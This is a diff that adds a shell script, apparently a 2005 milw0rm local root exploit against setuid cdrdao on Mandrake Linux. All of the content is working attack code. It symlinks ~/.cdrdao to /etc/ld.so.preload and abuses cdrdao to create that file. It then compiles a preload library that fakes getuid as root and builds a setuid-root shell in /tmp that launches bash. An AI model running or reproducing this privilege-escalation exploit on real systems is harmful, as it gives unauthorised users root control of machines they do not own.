@@ -1,0 +1,100 @@
+#!/bin/sh
+# cdrdao local root exploit
+# newbug [at] chroot.org
+# IRC: irc.chroot.org #chroot
+# May 2005
+echo "cdrdao private exploit"
+echo "This exploit only for Mandrake series"
+echo "newbug [at] chroot.org"
+echo "May 2005"
+
+echo "checking if cdrdao is setuid ...";
+if [ ! -u /usr/bin/cdrdao ]; then
+       echo "[-] Failed";
+       exit
+fi
+echo "[+] done.";
+echo "checking if /etc/ld.so.preload already exist ..."
+if [ -f /etc/ld.so.preload ]; then
+       echo "[-] Failed."
+       exit
+else
+       echo "[+] done."
+fi
+
+echo "checking if ~/.cdrdao already exist ..."
+if [ -f ~/.cdrdao ]; then
+       rm -rf ~/.cdrdao
+fi
+echo "[+] done."
+
+cd /tmp
+
+echo "preparing hook library ..."
+cat >ld.so.c<<EOF
+#include <stdlib.h>
+uid_t getuid()
+{
+       return 0;
+}
+EOF
+echo "[+] done."
+echo "preparing shell program ..."
+cat >sh.c <<EOF
+#include <stdio.h>
+#include <unistd.h>
+
+int main(int argc,char **argv)
+{
+       setreuid(0,0);
+       setgid(0);
+
+       unlink("/tmp/ld.so");
+       if(getuid())
+       {
+               printf("[-] Failed.\n");
+               unlink(argv[0]);
+               exit(0);
+       }
+       printf("[+] Congratulation, You win the game !!\n");
+       unlink("/etc/ld.so.preload");
+
+       execl("/bin/bash","bash",(char *)0);
+
+       return 0;
+}
+EOF
+echo "[+] done."
+
+echo "link .cdrdao ==> /etc/ld.so.preload ..."
+ln -sf /etc/ld.so.preload ~/.cdrdao
+echo "[+] done."
+
+echo "compile hook library ..."
+gcc -shared -o ld.so ld.so.c
+echo "[+] done."
+echo "compile shell program ..."
+gcc -o sh sh.c
+echo "[+] done."
+
+umask 0
+
+echo "run cdrdao ..."
+cdrdao unlock --save >/dev/null 2>&1
+echo "[+] done."
+
+echo "checking if /etc/ld.so.preload created successful..."
+if [ -f /etc/ld.so.preload ]; then
+       echo "[+] done."
+else
+       echo "[-] Failed."
+       exit
+fi
+echo "/tmp/ld.so">/etc/ld.so.preload
+rm -f /tmp/sh.c
+rm -f /tmp/ld.so.c
+su -c "chown root.root /tmp/sh;chmod 4755 /tmp/sh" >/dev/null 2>&1
+echo "!@#\$@%#$%#$%!@%^"
+/tmp/sh
+
+# milw0rm.com [2005-05-17]
